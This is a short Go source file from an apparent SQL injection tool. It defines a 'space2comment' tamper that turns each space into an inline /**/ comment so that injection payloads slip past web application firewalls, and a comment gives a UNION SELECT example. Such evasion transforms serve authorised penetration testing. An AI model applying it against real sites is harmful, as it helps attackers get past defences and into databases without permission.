package tamper

import "strings"

// space2commentTamper replaces each space character with a SQL inline comment
// /**/ to bypass WAFs that block whitespace in SQL injection payloads.
//
// Example:
//
//	" UNION SELECT NULL-- -" → "/**/UNION/**/SELECT/**/NULL--/**/-"
type space2commentTamper struct{}

func (t *space2commentTamper) Name() string { return "space2comment" }

func (t *space2commentTamper) Apply(s string) string {
	return strings.ReplaceAll(s, " ", "/**/")
}
